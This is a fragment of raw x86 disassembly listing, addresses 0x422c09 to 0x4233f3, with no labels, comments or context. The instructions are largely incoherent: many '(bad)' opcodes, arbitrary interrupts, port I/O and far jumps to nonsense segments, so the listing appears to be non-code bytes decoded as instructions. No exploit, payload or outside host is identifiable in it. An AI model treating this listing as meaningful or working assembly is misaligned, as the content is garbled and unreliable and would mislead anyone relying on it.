  422c09:	jge    0x422bde
  422c0b:	xacquire xchg BYTE PTR [ebx],dh
  422c0e:	ins    DWORD PTR es:[edi],dx
  422c0f:	ins    BYTE PTR es:[edi],dx
  422c10:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422c15:	outs   dx,DWORD PTR ds:[esi]
  422c16:	lods   al,BYTE PTR ds:[esi]
  422c17:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422c1d:	inc    esp
  422c1e:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422c28:	lea    edi,[ebp+0x4a58d0a]
  422c2e:	cli    
  422c2f:	test   BYTE PTR [edx+0x402cd77],al
  422c35:	mov    dh,0xa5
  422c37:	and    ebx,0xa58d04ef
  422c3d:	xchg   edx,eax
  422c3e:	mov    es,WORD PTR [edx+edi*8]
  422c41:	dec    esi
  422c42:	ja     0x422c62
  422c44:	pop    ebp
  422c45:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c4b:	int    0xf
  422c4d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c53:	jecxz  0x422c02
  422c55:	xchg   DWORD PTR [esi+0x7d],esi
  422c58:	or     dh,BYTE PTR [esi+0xd]
  422c5b:	in     al,dx
  422c5c:	inc    esi
  422c5d:	add    al,0xef
  422c5f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c65:	jecxz  0x422c53
  422c67:	jecxz  0x422c1f
  422c69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c6a:	pop    esi
  422c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c6c:	lods   eax,DWORD PTR ds:[esi]
  422c6d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c74:	lods   eax,DWORD PTR ds:[esi]
  422c75:	mov    ss,esi
  422c77:	mov    ebp,0x8086745d
  422c7c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c83:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c89:	test   al,0x33
  422c8b:	add    BYTE PTR [edx-0x33],bh
  422c8e:	leave  
  422c8f:	int    0xc6
  422c91:	or     eax,0x808059bd
  422c96:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c9e:	jecxz  0x422c89
  422ca0:	mov    ss,esi
  422ca2:	in     eax,dx
  422ca3:	in     al,dx
  422ca4:	add    BYTE PTR [eax],0x76
  422ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ca8:	int    0x8d
  422caa:	mov    ch,0x4
  422cac:	rcl    DWORD PTR [edx-0x32021933],cl
  422cb2:	leave  
  422cb3:	xor    esi,DWORD PTR [esi+0x34]
  422cb6:	pop    esi
  422cb7:	jbe    0x422c5e
  422cb9:	jnp    0x422c45
  422cbb:	int    0xf8
  422cbd:	xor    edx,esi
  422cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cc0:	int    0x96
  422cc2:	cmp    al,0x45
  422cc4:	inc    ecx
  422cc5:	inc    ebx
  422cc6:	add    esi,DWORD PTR [edi-0x79]
  422cc9:	jle    0x422ca1
  422ccb:	clc    
  422ccc:	or     ah,dh
  422cce:	std    
  422ccf:	das    
  422cd0:	pop    ecx
  422cd1:	adc    DWORD PTR [ebx-0x1a],eax
  422cd4:	cmp    al,0x2f
  422cd6:	or     esp,DWORD PTR [edx-0x2]
  422cd9:	add    BYTE PTR [eax],al
  422cdb:	mov    ebp,0x80808040
  422ce0:	xor    ebp,DWORD PTR [ebp-0x31]
  422ce3:	les    esi,FWORD PTR [esp+eiz*2]
  422ce6:	int    0x96
  422ce8:	sub    al,0xcd
  422cea:	(bad)  
  422ceb:	stc    
  422cec:	xor    edx,esi
  422cee:	sbb    al,0xa
  422cf0:	inc    edx
  422cf1:	int    0x96
  422cf3:	inc    esp
  422cf4:	int    0xe6
  422cf6:	std    
  422cf7:	xor    esp,esi
  422cf9:	xor    al,0xa
  422cfb:	pusha  
  422cfc:	retf   
  422cfd:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422d03:	test   al,0x9c
  422d05:	xor    ebp,DWORD PTR [ebp+0x6c]
  422d08:	in     al,dx
  422d09:	popf   
  422d0a:	adc    bh,ah
  422d0c:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422d13:	shl    ebp,cl
  422d15:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422d1b:	(bad)  
  422d1c:	and    al,0x77
  422d1e:	mov    ch,0xcd
  422d20:	jbe    0x422ccf
  422d22:	shr    DWORD PTR [ebp+0x760a4588],cl
  422d28:	lods   eax,DWORD PTR ds:[esi]
  422d29:	or     dl,dh
  422d2b:	stc    
  422d2c:	test   al,0xc5
  422d2e:	int    0x8d
  422d30:	jne    0x422d61
  422d32:	pop    ecx
  422d33:	ins    DWORD PTR es:[edi],dx
  422d34:	shl    edx,cl
  422d36:	test   BYTE PTR [edi-0x2c78428a],al
  422d3c:	in     al,dx
  422d3d:	xchg   BYTE PTR [edi],ch
  422d3f:	pop    ecx
  422d40:	ins    DWORD PTR es:[edi],dx
  422d41:	xchg   DWORD PTR [esi+0x75],esi
  422d44:	int    0xc6
  422d46:	jge    0x422d17
  422d48:	les    esi,FWORD PTR [esi-0x80]
  422d4b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d4e:	les    esi,FWORD PTR [esi-0x80]
  422d51:	adc    bh,ah
  422d53:	add    BYTE PTR [eax+0x24778180],0xcd
  422d5a:	mov    WORD PTR [esp+ebx*2],?
  422d5d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d64:	xor    al,0xa4
  422d66:	ja     0x422d8d
  422d68:	retf   0x31
  422d6b:	je     0x422da1
  422d6d:	pop    esp
  422d6e:	shl    ebp,cl
  422d70:	mov    BYTE PTR [ecx],cl
  422d72:	xchg   esp,eax
  422d73:	xor    al,0x2c
  422d75:	int    0xc
  422d77:	das    
  422d78:	mov    ebx,0xebd38096
  422d7d:	push   ebx
  422d7e:	das    
  422d7f:	rcl    DWORD PTR [ebx],1
  422d81:	pop    esi
  422d82:	mov    WORD PTR [esp+ebp*1],?
  422d85:	ja     0x422da1
  422d87:	int    0xdb
  422d89:	pop    edi
  422d8a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d91:	jmp    0x422d18
  422d93:	mov    eax,0x87808d81
  422d98:	ins    DWORD PTR es:[edi],dx
  422d99:	iret   
  422d9a:	les    esi,FWORD PTR [esp+ebp*2]
  422d9d:	(bad)
  422da0:	test   DWORD PTR [esi],edi
  422da2:	mov    WORD PTR [esp+ebp*1],?
  422da5:	xor    ebx,ebx
  422da7:	mov    eax,0x8780963e
  422dac:	ins    DWORD PTR es:[edi],dx
  422dad:	add    al,0x6d
  422daf:	or     edi,0xc56c34c4
  422db5:	cwde   
  422db6:	int    0xf0
  422db8:	mov    ebp,0xfcd9
  422dbd:	int    0xd9
  422dbf:	int    0xf
  422dc1:	jns    0x422d49
  422dc3:	mov    bh,0xbd
  422dc5:	sub    esp,edi
  422dc7:	add    BYTE PTR [eax],al
  422dc9:	cwde   
  422dca:	int    0xf0
  422dcc:	jns    0x422e46
  422dce:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422dd4:	add    BYTE PTR [eax-0x58798787],bl
  422dda:	mov    ebp,0xfc38
  422ddf:	jns    0x422e59
  422de1:	xchg   edx,eax
  422de2:	cmp    eax,0xeceb99cd
  422de7:	add    eax,DWORD PTR [eax]
  422de9:	add    BYTE PTR [esi-0x12ed1233],dl
  422def:	inc    esp
  422df0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422dfa:	leave  
  422dfb:	jbe    0x422db2
  422dfd:	inc    ecx
  422dfe:	and    DWORD PTR [esi-0x778932cb],eax
  422e04:	or     dh,BYTE PTR [esi-0x78]
  422e07:	int    0x76
  422e09:	stc    
  422e0a:	int    0x96
  422e0c:	stc    
  422e0d:	pop    ebx
  422e0e:	cwde   
  422e0f:	call   0xd3e3:0x3b9effc0
  422e16:	jmp    0x3586:0x21d1bf28
  422e1d:	cmp    eax,ebp
  422e1f:	sar    DWORD PTR [ebp+0xad25392],cl
  422e25:	jbe    0x422e9c
  422e27:	int    0x76
  422e29:	stc    
  422e2a:	int    0x96
  422e2c:	stc    
  422e2d:	cmp    eax,ebp
  422e2f:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e35:	jmp    0xfd76:0xad25328
  422e3c:	int    0x76
  422e3e:	stc    
  422e3f:	int    0x96
  422e41:	stc    
  422e42:	cmp    eax,ebp
  422e44:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e4a:	jmp    0xd076:0xad25328
  422e51:	int    0x76
  422e53:	stc    
  422e54:	int    0x96
  422e56:	stc    
  422e57:	cmp    eax,ebp
  422e59:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e5f:	jmp    0xbd76:0xad25328
  422e66:	leave  
  422e67:	jbe    0x422e96
  422e69:	dec    ecx
  422e6a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e71:	mov    al,ds:0x76c93586
  422e76:	and    eax,0x35862169
  422e7b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e7f:	jbe    0x422e51
  422e81:	or     dh,BYTE PTR [esi-0x30]
  422e84:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e8c:	ror    cl,1
  422e8e:	jbe    0x422e60
  422e90:	jo     0x422e12
  422e92:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e99:	add    BYTE PTR [eax-0x32068933],0x96
  422ea0:	stc    
  422ea1:	cmp    eax,ebp
  422ea3:	cmp    esp,ebx
  422ea5:	sar    DWORD PTR [ebp+0x28ead392],cl
  422eab:	push   ebx
  422eac:	ror    BYTE PTR [edx],cl
  422eae:	jbe    0x422e80
  422eb0:	int    0x76
  422eb2:	stc    
  422eb3:	int    0x96
  422eb5:	stc    
  422eb6:	cmp    eax,ebp
  422eb8:	cmp    esp,ebx
  422eba:	sar    DWORD PTR [ebp+0x28ead392],cl
  422ec0:	push   ebx
  422ec1:	ror    BYTE PTR [edx],cl
  422ec3:	jbe    0x422e95
  422ec5:	leave  
  422ec6:	jbe    0x422e5d
  422ec8:	arpl   WORD PTR [edx+0x76c98080],dx
  422ece:	lods   eax,DWORD PTR ds:[esi]
  422ecf:	pop    esi
  422ed0:	add    BYTE PTR [eax+0xd76c980],0xe6
  422ed7:	add    BYTE PTR [eax-0xa983080],0xff
  422ede:	add    BYTE PTR [eax],al
  422ee0:	iret   
  422ee1:	push   edi
  422ee2:	xchg   ebp,eax
  422ee3:	inc    DWORD PTR [eax]
  422ee5:	add    BYTE PTR [ebp+0xff13],bh
  422eeb:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ef1:	lea    ebp,[ebp-0x72ff562a]
  422ef7:	xchg   ebp,eax
  422ef8:	(bad)  
  422ef9:	fcmove st,st(1)
  422efb:	jbe    0x422eaa
  422efd:	dec    esi
  422efe:	ins    BYTE PTR es:[edi],dx
  422eff:	add    BYTE PTR [eax-0x32068933],0x8d
  422f06:	stc    
  422f07:	cmp    eax,ebp
  422f09:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422f0f:	cmp    ecx,DWORD PTR [edi]
  422f11:	shl    edx,cl
  422f13:	sub    BYTE PTR [ebx-0x2d],dl
  422f16:	or     dh,BYTE PTR [esi+0x6d]
  422f19:	int    0x76
  422f1b:	stc    
  422f1c:	int    0x8d
  422f1e:	stc    
  422f1f:	add    al,0xb6
  422f21:	cmc    
  422f22:	cmp    BYTE PTR [ebx],0xc5
  422f25:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422f2b:	repnz sub BYTE PTR [ebx-0x2d],dl
  422f2f:	or     dh,BYTE PTR [esi-0x6b]
  422f32:	mov    ah,0xb1
  422f34:	sbb    al,0x80
  422f36:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f3d:	push   eax
  422f3e:	or     dh,BYTE PTR [esi-0x13]
  422f41:	int    0x6c
  422f43:	dec    esp
  422f44:	or     dh,BYTE PTR [esi+0x11]
  422f47:	int    0x76
  422f49:	mov    bh,cl
  422f4b:	(bad)  
  422f4c:	cmc    
  422f4d:	or     cl,BYTE PTR [ecx]
  422f4f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f55:	mov    bh,cl
  422f57:	(bad)  
  422f58:	in     eax,dx
  422f59:	or     cl,BYTE PTR [ecx]
  422f5b:	push   ebp
  422f5c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f66:	lea    edx,[ecx]
  422f68:	or     cl,BYTE PTR [ecx]
  422f6a:	pop    ebp
  422f6b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f75:	stc    
  422f76:	int    0x96
  422f78:	stc    
  422f79:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f7c:	cdq    
  422f7d:	shr    ebx,cl
  422f7f:	xchg   edx,eax
  422f80:	shr    edx,cl
  422f82:	sub    BYTE PTR [ebx+0x13],dl
  422f85:	inc    ebx
  422f86:	jge    0x422fb7
  422f88:	add    eax,0x808087ca
  422f8d:	int    0x76
  422f8f:	mov    ch,cl
  422f91:	add    DWORD PTR ds:0xcd808081,esi
  422f97:	mov    ch,cl
  422f99:	jbe    0x422f23
  422f9b:	int    0x1
  422f9d:	xor    eax,0xcd808081
  422fa2:	add    BYTE PTR [edi-0x72329b92],0x88
  422fa9:	int    0xa
  422fab:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422fb1:	adc    al,0x0
  422fb3:	add    BYTE PTR [eax],al
  422fb5:	(bad)  
  422fb6:	int    0x96
  422fb8:	mov    ch,cl
  422fba:	mov    ds:0x80808125,al
  422fbf:	int    0x22
  422fc1:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422fc7:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422fcf:	bound  eax,QWORD PTR [eax]
  422fd1:	jno    0x422ff7
  422fd3:	cmp    ebp,DWORD PTR [ebp-0x37]
  422fd6:	push   es
  422fd7:	push   esp
  422fd8:	add    BYTE PTR [eax],al
  422fda:	add    BYTE PTR [esi],cl
  422fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fdd:	aad    0x49
  422fdf:	leave  
  422fe0:	push   es
  422fe1:	pop    esp
  422fe2:	add    BYTE PTR [eax],al
  422fe4:	add    BYTE PTR [edi+0x35],dl
  422fe7:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422fed:	add    BYTE PTR [eax],al
  422fef:	mov    ds:0x79d735c1,eax
  422ff4:	push   es
  422ff5:	ins    BYTE PTR es:[edi],dx
  422ff6:	add    BYTE PTR [eax],al
  422ff8:	add    BYTE PTR [eax],bl
  422ffa:	iret   
  422ffb:	outs   dx,BYTE PTR ds:[si]
  422ffd:	add    BYTE PTR [eax],al
  422fff:	add    BYTE PTR [edi+0x3b41afb8],ch
  423005:	ins    DWORD PTR es:[edi],dx
  423006:	leave  
  423007:	push   es
  423008:	sub    al,0x0
  42300a:	add    BYTE PTR [eax],al
  42300c:	push   cs
  42300d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42300e:	aad    0x49
  423010:	leave  
  423011:	push   es
  423012:	xor    al,0x0
  423014:	add    BYTE PTR [eax],al
  423016:	push   edi
  423017:	xor    eax,0x6c9ab13
  42301c:	cmp    al,0x0
  42301e:	add    BYTE PTR [eax],al
  423020:	mov    ds:0x79c335c1,eax
  423025:	push   es
  423026:	inc    esp
  423027:	add    BYTE PTR [eax],al
  423029:	add    BYTE PTR [eax],bl
  42302b:	iret   
  42302c:	addr16 inc esi
  42302e:	add    BYTE PTR [eax],al
  423030:	add    BYTE PTR [edi-0x32be5048],ch
  423036:	jbe    0x422fc0
  423038:	int    0x1
  42303a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423040:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423047:	int    0x76
  423049:	mov    ch,cl
  42304b:	add    DWORD PTR [ebp-0x7f],edi
  42304e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423055:	mov    dl,0x35
  423057:	leave  
  423058:	jbe    0x42305f
  42305a:	mov    bh,0x3f
  42305c:	cmp    DWORD PTR [edi-0x48],eax
  42305f:	leave  
  423060:	jbe    0x42306b
  423062:	xlat   BYTE PTR ds:[ebx]
  423063:	sbb    cl,cl
  423065:	push   es
  423066:	les    eax,FWORD PTR [eax]
  423068:	add    BYTE PTR [eax],al
  42306a:	push   cs
  42306b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42306c:	aad    0x49
  42306e:	leave  
  42306f:	push   es
  423070:	nop
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [edi+0x35],dl
  423076:	xlat   BYTE PTR ds:[ebx]
  423077:	inc    ecx
  423078:	leave  
  423079:	push   es
  42307a:	aam    0x0
  42307c:	add    BYTE PTR [eax],al
  42307e:	cmp    DWORD PTR [ecx+0x57],ecx
  423081:	jge    0x42304c
  423083:	push   es
  423084:	fadd   QWORD PTR [eax]
  423086:	add    BYTE PTR [eax],al
  423088:	mov    cl,0x3f
  42308a:	shl    DWORD PTR ds:0xe406c9,0x0
  423091:	add    BYTE PTR [edi-0x49],al
  423094:	xlat   BYTE PTR ds:[ebx]
  423095:	sbb    cl,cl
  423097:	push   es
  423098:	pushf  
  423099:	add    BYTE PTR [eax],al
  42309b:	add    BYTE PTR [esi],cl
  42309d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42309e:	aad    0x49
  4230a0:	leave  
  4230a1:	push   es
  4230a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230a3:	add    BYTE PTR [eax],al
  4230a5:	add    BYTE PTR [edi+0x35],dl
  4230a8:	xlat   BYTE PTR ds:[ebx]
  4230a9:	inc    ecx
  4230aa:	leave  
  4230ab:	push   es
  4230ac:	lods   al,BYTE PTR ds:[esi]
  4230ad:	add    BYTE PTR [eax],al
  4230af:	add    BYTE PTR [ecx],bh
  4230b1:	dec    ecx
  4230b2:	push   edi
  4230b3:	jge    0x42307e
  4230b5:	push   es
  4230b6:	mov    ah,0x0
  4230b8:	add    BYTE PTR [eax],al
  4230ba:	mov    cl,0x3f
  4230bc:	shl    DWORD PTR ds:0xbc06c9,0x0
  4230c3:	add    BYTE PTR [edi-0x49],al
  4230c6:	ret    
  4230c7:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  4230cd:	jo     0x42309c
  4230cf:	jbe    0x423106
  4230d1:	add    BYTE PTR [eax],dh
  4230d3:	int    0x76
  4230d5:	stc    
  4230d6:	int    0x8d
  4230d8:	stc    
  4230d9:	cmp    eax,ebp
  4230db:	cmp    ecx,DWORD PTR [edi]
  4230dd:	shl    edx,cl
  4230df:	sub    bl,dl
  4230e1:	mov    ebp,0xcdd35392
  4230e6:	lea    ebp,[ebp+0x52fd343]
  4230ec:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230f3:	int    0x8d
  4230f5:	mov    ch,0x3b
  4230f7:	lds    edi,FWORD PTR [ebx]
  4230f9:	psrlq  mm6,mm2
  4230fc:	sub    bl,dl
  4230fe:	mov    ebp,0xcdd35392
  423103:	lea    ebp,[ebp+0x76cd7d33]
  423109:	ins    DWORD PTR es:[edi],dx
  42310a:	inc    ebx
  42310b:	shr    DWORD PTR [edi],cl
  42310d:	or     ch,dl
  42310f:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  423119:	int    0x76
  42311b:	mov    ch,cl
  42311d:	rcl    BYTE PTR [ecx],1
  42311f:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  423129:	add    DWORD PTR [ebp-0x7f],esi
  42312c:	add    BYTE PTR [eax-0x7fc50943],0x80
  423133:	jo     0x423135
  423135:	cwde   
  423136:	xor    ch,cl
  423138:	lea    ecx,[eax-0x7ebaf533]
  42313e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423145:	int    0x5d
  423147:	adc    DWORD PTR [ecx-0x29327f80],eax
  42314d:	mov    BYTE PTR [ebx],bh
  42314f:	ins    DWORD PTR es:[edi],dx
  423150:	iret   
  423151:	pop    ss
  423152:	pushf  
  423153:	add    BYTE PTR [eax],al
  423155:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42315b:	jo     0x42312a
  42315d:	jbe    0x4230e7
  42315f:	int    0x1
  423161:	inc    ebp
  423162:	add    DWORD PTR [eax+0x500080],0x760a889a
  42316c:	adc    eax,0xcd8876cd
  423171:	pop    ebp
  423172:	adc    DWORD PTR [ecx-0x29327f80],eax
  423178:	mov    BYTE PTR [ebx],bh
  42317a:	ins    DWORD PTR es:[edi],dx
  42317b:	iret   
  42317c:	pop    ss
  42317d:	les    eax,FWORD PTR [eax]
  42317f:	add    BYTE PTR [eax],al
  423181:	mov    ebp,0x80803ad9
  423186:	jo     0x423155
  423188:	jbe    0x423112
  42318a:	int    0x1
  42318c:	inc    ebp
  42318d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423197:	mov    ch,cl
  423199:	pop    ebp
  42319a:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231a0:	mov    BYTE PTR [ebx],bh
  4231a2:	ins    DWORD PTR es:[edi],dx
  4231a3:	iret   
  4231a4:	pop    ss
  4231a5:	push   esp
  4231a6:	add    BYTE PTR [eax],al
  4231a8:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  4231ae:	jo     0x42317d
  4231b0:	jbe    0x42313a
  4231b2:	int    0x1
  4231b4:	inc    ebp
  4231b5:	add    DWORD PTR [eax+0x500080],0xb604889a
  4231bf:	pop    ebp
  4231c0:	or     BYTE PTR [edx],0x76
  4231c3:	xor    eax,0xc05d76cd
  4231c8:	push   ds
  4231c9:	cmp    ebx,edx
  4231cb:	sahf   
  4231cc:	clc    
  4231cd:	add    al,BYTE PTR [ecx]
  4231cf:	shr    BYTE PTR [esi+0x2f],cl
  4231d2:	pop    ecx
  4231d3:	shl    BYTE PTR [eax+0x0],cl
  4231d6:	xchg   esi,eax
  4231d7:	xor    eax,0x43d66d06
  4231dc:	int    0x76
  4231de:	pop    ebp
  4231df:	add    al,0xad
  4231e1:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  4231e8:	adc    eax,0x40d46d06
  4231ed:	int    0x76
  4231ef:	mov    ch,cl
  4231f1:	pop    ebp
  4231f2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231f8:	mov    BYTE PTR [ebx],bh
  4231fa:	ins    DWORD PTR es:[edi],dx
  4231fb:	iret   
  4231fc:	xchg   esi,eax
  4231fd:	add    DWORD PTR [ebp-0x7f7fc560],edi
  423203:	jo     0x4231d2
  423205:	jbe    0x42318f
  423207:	int    0x1
  423209:	cmp    eax,0x808081
  42320e:	push   eax
  42320f:	add    BYTE PTR [edx+0xd760a88],bl
  423215:	in     al,dx
  423216:	test   BYTE PTR [esi+esi*4],al
  423219:	or     eax,0x5d760080
  42321e:	add    al,0xe6
  423220:	pop    ebp
  423221:	sub    al,0x82
  423223:	sub    eax,0xcdb576cd
  423228:	lea    esi,[ebp-0x3f772933]
  42322e:	jmp    FWORD PTR [edx-0xfc43ac5]
  423234:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42323a:	push   ebx
  42323b:	ror    edi,cl
  42323d:	pop    ss
  42323e:	cmc    
  42323f:	inc    DWORD PTR [eax]
  423241:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423247:	jo     0x423216
  423249:	jbe    0x423244
  42324b:	int    0x8d
  42324d:	stc    
  42324e:	int    0xd6
  423250:	mov    BYTE PTR [ebx],bh
  423252:	lds    edi,FWORD PTR [ebx]
  423254:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42325b:	push   ebx
  42325c:	ror    edi,cl
  42325e:	pop    ss
  42325f:	xchg   ebp,eax
  423260:	inc    DWORD PTR [eax]
  423262:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423268:	jo     0x42326a
  42326a:	xchg   esi,eax
  42326b:	or     eax,0xcdf98dcd
  423270:	xchg   esi,eax
  423271:	stc    
  423272:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423275:	(bad)  
  423277:	jmp    0x42320b
  423279:	shr    edx,cl
  42327b:	sub    BYTE PTR [ebx+0x13],dl
  42327e:	inc    ebx
  42327f:	jge    0x423257
  423281:	mov    ecx,ecx
  423283:	jbe    0x4232c2
  423285:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42328f:	cmp    eax,ebp
  423291:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423297:	repnz sub BYTE PTR [ebx-0x2d],dl
  42329b:	xchg   DWORD PTR [esi+0x6d],esi
  42329e:	or     dh,BYTE PTR [esi+0x6d]
  4232a1:	int    0x76
  4232a3:	cmp    eax,0x1cd46d06
  4232a8:	int    0x76
  4232aa:	mov    ch,0xcd
  4232ac:	lea    esi,[ebp-0xfc43ac5]
  4232b2:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4232b8:	push   ebx
  4232b9:	rol    DWORD PTR [edi+0x760a9576],cl
  4232bf:	xchg   ebp,eax
  4232c0:	int    0x76
  4232c2:	mov    ch,0xcd
  4232c4:	lea    esi,[ebp-0xfc43ac5]
  4232ca:	shl    edx,cl
  4232cc:	sub    bl,dl
  4232ce:	mov    ebp,0xcdd35392
  4232d3:	lea    ebp,[ebp+0x76cd7d33]
  4232d9:	ins    DWORD PTR es:[edi],dx
  4232da:	inc    ebx
  4232db:	shr    DWORD PTR [edi],cl
  4232dd:	pop    es
  4232de:	push   eax
  4232df:	inc    DWORD PTR [eax]
  4232e1:	add    al,al
  4232e3:	jmp    FWORD PTR [eax-0x326a8933]
  4232e9:	lea    ebp,[ebp+0x43]
  4232ec:	jge    0x4232c4
  4232ee:	xor    DWORD PTR [eax],eax
  4232f0:	(bad)  
  4232f1:	mov    bh,cl
  4232f3:	jbe    0x4232f2
  4232f5:	jo     0x4232b4
  4232f7:	stc    
  4232f8:	jl     0x42327a
  4232fa:	or     BYTE PTR [edx],0x76
  4232fd:	jne    0x4232eb
  4232ff:	sbb    cl,ch
  423301:	jbe    0x423378
  423303:	int    0x8d
  423305:	mov    ch,0xcd
  423307:	xchg   esi,eax
  423308:	mov    ch,0x3b
  42330a:	or     al,0x3b
  42330c:	cdq    
  42330d:	shr    ebx,cl
  42330f:	xchg   edx,eax
  423310:	shr    edx,cl
  423312:	sub    BYTE PTR [ebx+0x13],dl
  423315:	push   ecx
  423316:	mov    ch,cl
  423318:	jbe    0x423313
  42331a:	int    0x8d
  42331c:	stc    
  42331d:	cmp    eax,ebp
  42331f:	cmp    ecx,DWORD PTR [edi]
  423321:	shl    edx,cl
  423323:	sub    bl,dl
  423325:	mov    ebp,0xcdd35392
  42332a:	lea    esi,[ebp+0x43]
  42332d:	shr    DWORD PTR [edi],cl
  42332f:	add    eax,0x80805300
  423334:	int    0x76
  423336:	stc    
  423337:	int    0x8d
  423339:	stc    
  42333a:	cmp    eax,ebp
  42333c:	cmp    ecx,DWORD PTR [edi]
  42333e:	shl    edx,cl
  423340:	sub    bl,dl
  423342:	mov    ebp,0xcdd35392
  423347:	(bad)  
  423348:	std    
  423349:	inc    ebx
  42334a:	shr    DWORD PTR [edi],cl
  42334c:	add    eax,0x808053ea
  423351:	int    0x76
  423353:	stc    
  423354:	int    0x8d
  423356:	stc    
  423357:	cmp    eax,ebp
  423359:	cmp    ecx,DWORD PTR [edi]
  42335b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423361:	push   ebx
  423362:	shr    esp,cl
  423364:	adc    al,0xcd
  423366:	lea    esi,[ebp+0x3bb596cd]
  42336c:	or     al,0x3b
  42336e:	cdq    
  42336f:	shr    ebx,cl
  423371:	xchg   edx,eax
  423372:	shr    edx,cl
  423374:	sub    BYTE PTR [ebx+0x13],dl
  423377:	xchg   ebx,edx
  423379:	int    0x8d
  42337b:	std    
  42337c:	inc    ebx
  42337d:	rol    DWORD PTR [edx-0x2893219],cl
  423383:	or     dh,BYTE PTR [esi-0x53]
  423386:	int    0x76
  423388:	jne    0x423394
  42338a:	jbe    0x42335c
  42338c:	ret    
  42338d:	dec    ecx
  42338e:	and    DWORD PTR [esi+0x45e60a35],eax
  423394:	leave  
  423395:	jbe    0x423334
  423397:	inc    ecx
  423398:	and    DWORD PTR [esi+0x4576cd35],eax
  42339e:	int    0x8d
  4233a0:	inc    ebp
  4233a1:	cmp    eax,ebp
  4233a3:	cmp    ecx,DWORD PTR [edi]
  4233a5:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233ab:	push   ebx
  4233ac:	ror    DWORD PTR [edx],cl
  4233ae:	jbe    0x423405
  4233b0:	int    0x76
  4233b2:	inc    ebp
  4233b3:	int    0x8d
  4233b5:	inc    ebp
  4233b6:	cmp    eax,ebp
  4233b8:	cmp    ecx,DWORD PTR [edi]
  4233ba:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233c0:	push   ebx
  4233c1:	ror    DWORD PTR [edx],cl
  4233c3:	jbe    0x42335a
  4233c5:	leave  
  4233c6:	jbe    0x423405
  4233c8:	dec    eax
  4233c9:	and    DWORD PTR [esi+0x1d76c935],eax
  4233cf:	ret    0x8621
  4233d2:	xor    eax,0xcd4576cd
  4233d7:	lea    eax,[ebp+0x3b]
  4233da:	lds    edi,FWORD PTR [ebx]
  4233dc:	psrlq  mm6,mm2
  4233df:	sub    bl,dl
  4233e1:	mov    ebp,0xcdd35392
  4233e6:	lea    ebp,[ebp+0x52f7d43]
  4233ec:	push   ss
  4233ed:	xchg   DWORD PTR [eax-0x6d241480],eax
  4233f3:	add    BYTE PTR [eax-0x32c27233],0x76
